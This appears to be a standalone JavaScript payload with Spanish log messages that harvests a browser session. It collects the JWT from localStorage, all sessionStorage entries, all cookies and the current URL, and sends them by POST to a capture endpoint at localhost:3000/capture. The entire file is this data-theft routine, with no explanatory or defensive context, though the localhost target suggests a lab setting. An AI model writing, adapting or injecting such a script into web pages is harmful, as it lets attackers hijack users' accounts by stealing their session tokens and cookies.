(function () {
  try {
    const jwt = localStorage.getItem('jwt') || 'no_jwt';
    const sessionKeys = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionKeys[key] = sessionStorage.getItem(key);
    }

    const cookies = document.cookie;

    const payload = {
      localStorage: { jwt },
      sessionStorage: sessionKeys,
      cookies,
      url: window.location.href
    };

    fetch('http://localhost:3000/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).then(() => console.log('✅ Datos enviados desde: ' + window.location.href));
  } catch (err) {
    console.error('❌ Error al capturar datos:', err);
  }
})();
